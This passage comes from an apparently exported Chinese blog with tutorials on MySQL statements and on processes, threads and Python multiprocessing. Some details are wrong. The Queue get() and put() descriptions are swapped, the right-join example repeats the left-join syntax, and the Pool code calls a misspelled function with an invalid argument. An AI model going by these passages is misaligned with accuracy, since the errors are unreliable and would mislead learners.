<h3 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h3><p>修改表结构指增加或删除字段、修改字段名称或字段类型、设置取消主键外键、设置取消索引等</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 数据表名 alter_spec[,alter_spec] | table_options</span><br></pre></td></tr></table></figure>
<p>alter_spec:  </p>
<ul>
<li>add create_defination[first | after column_name] //添加新字段</li>
<li>add index [index_name] (index_col_name) //添加索引名称</li>
<li>add primary key (index_col_name) //添加主键名称</li>
<li>add unique [index_name] (index_col_name) //添加唯一索引</li>
<li>alter col_name {set default 默认值 | drop default} //修改字段默认值</li>
<li>change old_col_name create_defination //修改字段名、类型</li>
<li>modify col_name create_defination //修改字段定义</li>
<li>drop col_name //删除字段</li>
<li>drop index index_name //删除索引</li>
<li>rename as new_tab_name //修改表名</li>
</ul>
<p><strong><code>alter table</code> 语句允许指定多个动作，其动作间用逗号分隔，每个动作表示一个修改。</strong></p>
<ul>
<li>添加新字段及修改字段定义：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">add</span> email <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">after</span> location,</span><br><span class="line"><span class="keyword">modify</span> <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>修改字段名：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">change</span> <span class="keyword">user</span> username varhcar(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>删除字段：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">drop</span> email;</span><br></pre></td></tr></table></figure>
<ul>
<li>修改表名：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">rename</span> the_users;</span><br></pre></td></tr></table></figure>
<h3 id="复制表"><a href="#复制表" class="headerlink" title="复制表"></a>复制表</h3><p>在一张已存在的数据表的基础上创建一份该表的备份，也就是复制表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [<span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span>] 数据表名 <span class="keyword">like</span> 源数据表名;</span><br></pre></td></tr></table></figure>
<p>使用该语法复制数据表时，将创建一个与源数据表相同结构的新表，该数据表的别名、数据类型和索引都将被复制，但是表的内容是不会被复制的。因此，创建的表是一张<strong>空表</strong>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">user</span> <span class="keyword">like</span> the_users;</span><br></pre></td></tr></table></figure>
<p>如果在复制表格式的同时也想复制表中的内容，可以使用<code>as</code>（查询表达式）字句实现：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">user</span> <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> the_users;</span><br></pre></td></tr></table></figure>
<h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> [<span class="keyword">if</span> <span class="keyword">exists</span>] 数据表名;</span><br></pre></td></tr></table></figure>
<p>可同时删除多张表，多个表之间用逗号<code>,</code>连接。</p>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> [<span class="keyword">low_priority</span> | <span class="keyword">delayed</span> | <span class="keyword">high_priority</span>] [<span class="keyword">ignore</span>]</span><br><span class="line">[<span class="keyword">into</span>] 数据表名 [(字段名)] <span class="keyword">values</span> (&#123;值 | <span class="keyword">default</span>&#125;),(...),...</span><br></pre></td></tr></table></figure>
<ul>
<li>[low_priority | delayed | high_priority]：<code>low_priority</code> 是 <code>insert</code>、<code>delete</code>、<code>update</code> 都可选的操作，降低 <code>insert</code>、<code>delete</code>、<code>update</code> 的优先级。<code>delayed</code> 是 <code>insert</code> 语句支持的一种可选修饰符，用于指定MySQL服务器把待插入的行数据放在一个缓冲器中，直到待插数据的表空闲时，才真正的在表中插入数据行。<code>high_priority</code> 是 <code>insert</code>和 <code>select</code> 语句支持的一种可选修饰符，用于指定 <code>insert</code> 和 <code>select</code> 操作优先执行。</li>
<li>[ignore]： 在执行 <code>insert</code> 语句时，所出现的错误都会被当做警告</li>
<li>[into]： 指定被操作的数据表</li>
<li>[(字段名,…)]： 当不指定该选项时，表示要向表中所有列插入数据，否则表示向数据表的指定列插入数据。</li>
<li><p>({值 | default}),(…),…：用于指定需要插入的数据清单，其<strong>顺序必须与字段的顺序相对应</strong>。其中的每一列的数据可以是一个变量、常量、表达式或者null。但是其<strong>数据类型要与对应的字段类型相匹配</strong>；也可以使用 <code>default</code> 关键字，表示为该列插入默认值，但是前提是已经明确指定了默认值，否则会出错。</p>
</li>
<li><p>插入完整数据：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">'qiuyue'</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>插入数据记录的一部分：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">name</span>, age) <span class="keyword">values</span> (<span class="string">'qiuyue'</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>插入查询结果：MySQL 支持将查询结果插入到数据表中</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 数据表名[(字段名,...)] <span class="keyword">select</span> ...;</span><br></pre></td></tr></table></figure>
<p><strong>select 字句返回的结果集中的字段数量、字段类型必须与目标数据表完全一致。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (username,age) <span class="keyword">select</span> username,age <span class="keyword">from</span> students;</span><br></pre></td></tr></table></figure>
<h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 数据表名</span><br><span class="line"><span class="keyword">set</span> 字段<span class="number">1</span>=值<span class="number">1</span>[,字段<span class="number">2</span>=值<span class="number">2</span> ...]</span><br><span class="line">[<span class="keyword">where</span> 条件表达式] [<span class="keyword">order</span> by...] [<span class="keyword">limit</span> 行数]</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> username = <span class="string">'qiuyue'</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 数据表名</span><br><span class="line">[<span class="keyword">where</span> 条件表达式] [<span class="keyword">order</span> by...] [<span class="keyword">limit</span> 行数];</span><br></pre></td></tr></table></figure>
<p><strong>如果没有指定 <code>where</code> 条件，将删除所有记录</strong>。  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>如果要删除所有行，还可以使用 <code>truncate table</code> 语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">truncate</span> [<span class="keyword">table</span>] 数据表名</span><br></pre></td></tr></table></figure>
<p><code>truncate</code> 会<strong>删除数据表中所有数据且无法恢复</strong>。<br><code>delete</code> 与 <code>truncate</code> 区别如下：</p>
<ol>
<li>使用 <code>truncate</code> 语句会重新设置 <code>auto_increment</code> 计数器的初始值</li>
<li>对于参与了索引和视图的表不能使用 <code>truncate</code> 语句</li>
<li><code>truncate</code> 比 <code>delete</code> 使用的系统和事物资源少。每删除一条记录 <code>delete</code> 语句都会添加一条日志，而 <code>truncate</code> 只在事物日志中记录页的释放。</li>
</ol>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> selection_list</span><br><span class="line"><span class="keyword">from</span> 数据表名</span><br><span class="line"><span class="keyword">where</span> primary_constraint</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> sroting_cloumns </span><br><span class="line"><span class="keyword">having</span> secondary_constraint</span><br><span class="line"><span class="keyword">limit</span> <span class="keyword">count</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查询一张表的一列或多列：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>; //查询users表所有内容</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,age <span class="keyword">from</span> <span class="keyword">users</span>; //查询users表id列和age列所有内容</span><br></pre></td></tr></table></figure>
<ul>
<li>从多个表中获取数据：</li>
</ul>
<p>使用 <code>select</code> 语句进行多表查询，需要确定所查询的数据在哪个表中，多个表之间用 <code>,</code>分隔：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> users.id, users.name, student.id, student.name</span><br><span class="line"><span class="keyword">from</span> <span class="keyword">users</span>, student;</span><br></pre></td></tr></table></figure>
<p>还可以在 <code>where</code> 子句中用连接符 <code>=</code> 来确定表之间的联系。然后根据这个条件返回查询结果：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> users.name,student.location <span class="keyword">from</span> <span class="keyword">users</span>,studnet <span class="keyword">where</span> users.id=student.id <span class="keyword">and</span> users.id=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>users.id=student.id</code> 表示将 users 和 student 两张表根据 <code>users.id=stduent.id</code> 的条件连接起来，叫做等同连接。如果不使用 <code>users.id=stduent.id</code> 那么产生的结果是两张表的笛卡尔积，叫全连接。</p>
<ul>
<li>带关键字 in 的查询：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 [<span class="keyword">not</span>] <span class="keyword">in</span> (元素<span class="number">1</span>，元素<span class="number">2</span> ...);</span><br></pre></td></tr></table></figure>
<p>关键字 <code>in</code> 可以判断某个字段的值是否在指定的集合中，如果在该记录会被查询出来：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,age <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">in</span> (<span class="string">'Mike'</span>, <span class="string">'David'</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>带关键字between…and…的范围查询：between…and… 是<strong>前闭后闭</strong>的</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">7</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>带like的字符匹配查询：通过 <code>like</code> 可以实现模糊查询，它有两种通配符 <code>%</code> 和 <code>_</code>:<ul>
<li>% 可以匹配 0 个或多个字符，可以代表任意长度的字符串。如 “Mi%ke” 可以匹配Mike，Miosfke等</li>
<li>_ 最多只能匹配一个字符。</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">like</span> <span class="string">"Jack_a"</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> studnet <span class="keyword">where</span> location <span class="keyword">like</span> <span class="string">"China\_%"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>group by 分组查询</li>
</ul>
<p>通过关键字 <code>group by</code> 可以将数据划分到不同的组中，实现对记录的分组查询。常搭配 count(), sum(), avg(), max(), min() 等聚合函数使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> class_id;</span><br><span class="line"><span class="keyword">select</span> class_id, <span class="keyword">count</span>(*) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> class_id;</span><br></pre></td></tr></table></figure>
<h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><p>连接是把不同表的记录连接在一起的最普遍的方法。</p>
<ul>
<li>内连接查询：把不符合连接条件的行从视图中删除，最常见的例子是相等查询：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s.name,s.age,s.class_id,c.name <span class="keyword">as</span> class_name </span><br><span class="line"><span class="keyword">from</span> students <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">join</span> classes <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">on</span> s.class_id = c.id <span class="keyword">and</span> s.id &gt; <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>左外连接：返回结果除了内连接的数据外，还包括左表中不符合条件的数据，并在右表相应列加 null 值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 左表名 <span class="keyword">left</span> <span class="keyword">join</span> 右表名 <span class="keyword">on</span> 条件;</span><br></pre></td></tr></table></figure>
<ul>
<li>右外连接：返回结果除了内连接的数据外，还包括右表中不符合条件的数据，并在左表相应列加 null 值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 左表名 <span class="keyword">left</span> <span class="keyword">join</span> 右表名 <span class="keyword">on</span> 条件;</span><br></pre></td></tr></table></figure>
<h1 id="语句执行顺序"><a href="#语句执行顺序" class="headerlink" title="语句执行顺序"></a>语句执行顺序</h1><p>MySQL的语句一共分为11步，如下图所标注的那样，最先执行的总是FROM操作，最后执行的是LIMIT操作。其中每一个操作都会产生一张虚拟的表，这个虚拟的表作为一个处理的输入，只是这些虚拟的表对用户来说是透明的，但是只有最后一个虚拟的表才会被作为结果返回。如果没有在语句中指定某一个子句，那么将会跳过相应的步骤。  </p>
<p><img src="https://i.loli.net/2019/02/24/5c720eb160e17.jpg" alt="执行顺序">  </p>
<p>下面来分析一下这些语句：  </p>
<ol>
<li>FORM: 对FROM的左边的表和右边的表计算笛卡尔积。产生虚表VT1</li>
<li>ON: 对虚表VT1进行ON筛选，只有那些符合 <join-condition> 的行才会被记录在虚表VT2中。</join-condition></li>
<li>JOIN： 如果指定了OUTER JOIN（比如left join、 right join），那么保留表中未匹配的行就会作为外部行添加到虚拟表VT2中，产生虚拟表VT3,如果from子句中包含两个以上的表的话，那么就会对上一个join连接产生的结果VT3和下一个表重复执行步骤1~3这三个步骤，一直到处理完所有的表为止。</li>
<li>WHERE： 对虚拟表VT3进行WHERE条件过滤。只有符合 <where-condition> 的记录才会被插入到虚拟表VT4中。</where-condition></li>
<li>GROUP BY: 根据group by子句中的列，对VT4中的记录进行分组操作，产生VT5.</li>
<li>CUBE | ROLLUP: 对表VT5进行cube或者rollup操作，产生表VT6.</li>
<li>HAVING： 对虚拟表VT6应用having过滤，只有符合 <having-condition> 的记录才会被 插入到虚拟表VT7中。</having-condition></li>
<li>SELECT： 执行select操作，选择指定的列，插入到虚拟表VT8中。</li>
<li>DISTINCT： 对VT8中的记录进行去重。产生虚拟表VT9.</li>
<li>ORDER BY: 将虚拟表VT9中的记录按照 &lt;order_by_list&gt; 进行排序操作，产生虚拟表VT10.</li>
<li>LIMIT：取出指定行的记录，产生虚拟表VT11, 并将结果返回。  </li>
</ol>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>进程与线程</title>
    <url>/2018/01/09/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>众所周知，CPU 是计算机的核心，它承担了所有的计算任务。而操作系统是计算机的管理者，是一个大管家，它负责任务的调度，资源的分配和管理，统领整个计算机硬件。应用应用程序是具有某种功能的程序，程序运行与操作系统之上。</p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>进程是一个具有一定功能的程序在一个数据集上的一次动态执行过程。进程由程序，数据集合和进程控制块三部分组成。程序用于描述进程要完成的功能，是控制进程执行的指令集；数据集合是程序在执行时需要的数据和工作区；程序控制块（PCB）包含程序的描述信息和控制信息，是进程存在的唯一标志，<strong>换言之，在操作系统看来进程不过是一个个的 PCB 罢了</strong>。<strong>不同的进程之间拥有的独立的控制流和虚拟内存空间</strong>。</p>
<p>简单来说进程就是动起来的程序。</p>
<h3 id="写时复制-Copy-On-Write"><a href="#写时复制-Copy-On-Write" class="headerlink" title="写时复制(Copy On Write)"></a>写时复制(Copy On Write)</h3><p>写时复制（COW）是 Linux 中一种用于延迟复制数据的技术。就像小时候做作业，我们对父母声明今晚会好好学习，但实际上只有在他们来你房间检查时你才打开书写几题。在操作系统中也是同理，由于创建一个子进程需要分配新的内存空间，还要把父进程的数据复制到子进程，这个过程是很繁琐的。但是我们真的需要这么多父进程的数据吗？其实很多时候我们创建一个子进程，只是为了执行一些独立的任务，这些任务和父进程没多大关系，比如使用 exec() 装载一个程序到子进程的内存空间，然后子进程就跑去执行这个程序去了。那一开始又何必费那么大力气去复制父进程的数据呢？这就引出了 COW。</p>
<p>fork() 出一个子进程后，子进程其实与父进程使用<strong>相同的物理内存空间</strong>。子进程的代码段、数据段、堆栈都指向父进程的物理内存。如此一来，创建一个子进程需要的操作就大大减少了！</p>
<p>那么什么时候子进程获得自己独立的内存呢？答案就是当父子进程间共享的物理内存发生写操作的时候。当某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本给该调用者，而其他调用者所见到的最初的资源仍然保持不变。<strong>这个过程对其他的调用者是透明的</strong>。</p>
<p>Copy On Write 实现原理：</p>
<blockquote>
<p>fork() 之后，kernel 把父进程中所有的内存页的权限都设为 read-only，然后子进程的地址空间指向父进程。当父子进程都只读内存时，相安无事。当其中某个进程写内存时，CPU 硬件检测到内存页是 read-only 的，于是触发页异常中断（page-fault），陷入 kernel 的一个中断例程。中断例程中，kernel就会把触发的异常的页复制一份，于是父子进程各自持有独立的一份。</p>
</blockquote>
<p>说了那么多，COW 好处都有啥？</p>
<ul>
<li>减少不必要的复制操作，快速创建子进程。</li>
</ul>
<p>当然，它的弊端也显而易见：</p>
<ul>
<li>如果 fork() 之后子进程和父进程需要对共享的内存执行大量的写操作，那么会频繁地引发缺页异常，反而增加了系统的负担。</li>
</ul>
<p>举个例子：Redis 执行 BGSAVE 或 BGREWRITEAOF 命令时会创建子进程执行数据库备份操作。由于操作系统采用 COW 技术，为了避免此时父进程 rehash 导致大量写操作，在子进程备份操作期间服务器会提高负载因子的阈值避免不必要的内存写入操作，最大限度地节约内存。</p>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>在很早的时候计算机并没有线程这个概念，但是随着时代的发展，只用进程来处理程序出现很多的不足。如当一个进程堵塞时，整个程序会停止在堵塞处，并且如果频繁的切换进程，会浪费系统资源。所以线程出现了。  </p>
<p>线程是能拥有资源和独立运行的最小单位，也是程序执行的最小单位。一个进程可以拥有多个线程，而且属于同一个进程的多个线程间会共享该进行的资源。</p>
<h2 id="进程与线程的区别"><a href="#进程与线程的区别" class="headerlink" title="进程与线程的区别"></a>进程与线程的区别</h2><ol>
<li>一个进程由一个或者多个线程组成，线程是一个进程中代码的不同执行路线。</li>
<li>切换进程需要的资源比切换线程的要多的多。</li>
<li>进程之间相互独立，而同一个进程下的线程共享程序的内存空间（如代码段，数据集，堆栈等）。某进程内的线程在其他进程不可见。换言之，线程共享同一片内存空间，而进程各有独立的内存空间。</li>
</ol>
<p>以下是我在知乎上看到的关于进程与线程的讨论，其中一个作者感觉很有道理，摘抄如下：</p>
<blockquote>
<p>首先来一句概括的总论：进程和线程都是一个时间段的描述，是CPU工作时间段的描述。下面细说背景：CPU + RAM + 各种资源（比如显卡，光驱，键盘，GPS, 等等外设）构成我们的电脑，但是电脑的运行，实际就是CPU和相关寄存器以及 RAM 之间的事情。一个最最基础的事实：CPU 太快，太快，太快了，寄存器仅仅能够追的上他的脚步，RAM 和别的挂在各总线上的设备完全是望其项背。那当多个任务要执行的时候怎么办呢？轮流着来?或者谁优先级高谁来？不管怎么样的策略，一句话就是在 CPU 看来就是轮流着来。一个必须知道的事实：执行一段程序代码，实现一个功能的过程介绍 ，当得到CPU的时候，相关的资源必须也已经就位，就是显卡啊，GPS 啊什么的必须就位，然后CPU开始执行。这里除了 CPU 以外所有的就构成了这个程序的执行环境，也就是我们所定义的程序上下文。当这个程序执行完了，或者分配给他的 CPU 执行时间用完了，那它就要被切换出去，等待下一次CPU的临幸。在被切换出去的最后一步工作就是保存程序上下文，因为这个是下次他被CPU临幸的运行环境，必须保存。串联起来的事实：前面讲过在 CPU 看来所有的任务都是一个一个的轮流执行的，具体的轮流方法就是：先加载程序 A 的上下文，然后开始执行 A，保存程序A的上下文，调入下一个要执行的程序 B 的程序上下文，然后开始执行 B,保存程序B的上下文。。。。<br>========= 重要的东西出现了========<br>进程和线程就是这样的背景出来的，两个名词不过是对应的 CPU 时间段的描述，名词就是这样的功能。进程就是包括上下文切换的程序执行时间总和 = CPU加载上下文+ CPU 执行+ CPU 保存上下文。线程是什么呢？进程的颗粒度太大，每次都要有上下的调入，保存，调出。如果我们把进程比喻为一个运行在电脑上的软件，那么一个软件的执行不可能是一条逻辑执行的，必定有多个分支和多个程序段，就好比要实现程序A，实际分成 a，b，c等多个块组合而成。那么这里具体的执行就可能变成：程序 A 得到 CPU -&gt; CPU 加载上下文，开始执行程序 A 的 a 小段，然后执行 A 的 b 小段，然后再执行 A 的 c 小段，最后 CPU 保存 A 的上下文。这里 a，b，c 的执行是共享了 A 的上下文，CPU 在执行的时候没有进行上下文切换的。这里的 a，b，c 就是线程，也就是说线程是共享了进程的上下文环境，的更为细小的 CPU 时间段。到此全文结束，再一个总结：进程和线程都是一个时间段的描述，是 CPU 工作时间段的描述，不过是颗粒大小不同。  </p>
</blockquote>
<h2 id="Pool-进程池"><a href="#Pool-进程池" class="headerlink" title="Pool 进程池"></a>Pool 进程池</h2><p>需要创建多个进程时，可以使用multiprocessing中的Pool类开进程池。Pool()默认开启数量等于当前cpu核心数的子进程（当然可以手动改变）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">"hello ,this is the %d process"</span> % i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        p.apply_async(target=hell0,args=(i,))</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>apply_async 表示在开进程时不阻塞主进程，是异步 IO 的一种方式之一。targe参数传入要在子线程中执行的<strong>函数对象</strong>，args以元组的方式传入函数的参数。<br>join() 会等待线程池中的每一个线程执行完毕，在 join() 之前必须要先 close()，close() 表示不能再向线程池中添加新的 process 了。</p>
<h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><p>每个进程各自有不同的用户地址空间,任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核,在内核中开辟一块缓冲区,进程A把数据从用户空间拷到内核缓冲区,进程B再从内核缓冲区把数据读走,内核提供的这种机制称为进程间通信。假如创建了多个进程，那么进程间的通信是必不可少的。Python 提供了多种进程通信的方式，其中以 Queue 和 Pipe 用得最多。下面分别介绍这两种模式。</p>
<h3 id="共享内存通信"><a href="#共享内存通信" class="headerlink" title="共享内存通信"></a>共享内存通信</h3><p>让操作系统维持一块共享内存，所有要互相通信的进程通过这块内存交换信息。这样做的缺点是要格外注意数据同步问题。</p>
<p>下面以 Python 中 Queue 为例子做一个示范。Queue 是一种多进程安全的队列，其实现多进程间的通信有两种方法：</p>
<ul>
<li>get() 用于向队列中加入数据。有两个属性：blocked 和 timeout。blocked 为 true 时（默认为True）且 timeout 为正值时，如果当队列已满会阻塞 timeout 时间，在这个时间内如果队列有空位会加入，如果超过时间仍然没有空位会抛出 Queue.Full 异常。</li>
<li>put() 用于从队列中获取一个数据并将其从队列中删除。有两个属性：blocked 和timeout。blocked 为 true（默认为True）且 timeout 为正值时，如果当前队列为空会阻塞 timeout 时间，在这个时间内如果队列有新数据会获取，如果超过时间仍然没有新数据会抛出 Queue.Empty 异常。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span><span class="params">(q,nums)</span>:</span></span><br><span class="line">    print(<span class="string">'现在的进程编号为：%s，这是一个put进程'</span> % os.getpid())</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        q.put(num)</span><br><span class="line">        print(<span class="string">'%d已经放入队列中啦！'</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(q)</span>:</span></span><br><span class="line">    print(<span class="string">'现在的进程编号为：%s，这是一个get进程'</span> % os.getpid())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'已经从队列中获取%s并从中删除'</span> % q.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=put_data,args=(q,[<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>],))</span><br><span class="line">    p2 = Process(target=put_data,args=(q,[<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>],))</span><br><span class="line">    p3 = Process(target=get_data,args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line">    p3.start()</span><br><span class="line">    p1.join()</span><br><span class="line">    p2.join()</span><br><span class="line">    <span class="comment"># p3是个死循环，需要手动结束这个进程</span></span><br><span class="line">    p3.terminate()</span><br></pre></td></tr></table></figure>
<p>我们来看一下运行结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">现在的进程编号为：10336，这是一个put进程</span><br><span class="line">1已经放入队列中啦！</span><br><span class="line">2已经放入队列中啦！</span><br><span class="line">3已经放入队列中啦！</span><br><span class="line">现在的进程编号为：9116，这是一个get进程</span><br><span class="line">已经从队列中获取1,并从中删除</span><br><span class="line">已经从队列中获取2并从中删除</span><br><span class="line">已经从队列中获取3并从中删除</span><br><span class="line">现在的进程编号为：2732，这是一个put进程</span><br><span class="line">4已经放入队列中啦！</span><br><span class="line">5已经放入队列中啦！</span><br><span class="line">已经从队列中获取4,并从中删除</span><br><span class="line">6已经放入队列中啦！</span><br><span class="line">已经从队列中获取5并从中删除</span><br><span class="line">已经从队列中获取6并从中删除</span><br></pre></td></tr></table></figure>
<h3 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h3><p>操作系统在两个进程间维持一个“管道”，这两个进程通过这条管道交换彼此的信息。这样做缺点很多，比如只能在两个进程间交换数据、容易引起阻塞等。</p>
<p>下面以 Python 中 Pipe 为例子做一个示范。Pipe 就像一根水管，两边是进程。让我们看看Pipe官方文档的描述：  </p>
<blockquote>
<p>Returns a pair (conn1, conn2) of Connection objects representing the ends of a pipe.</p>
</blockquote>
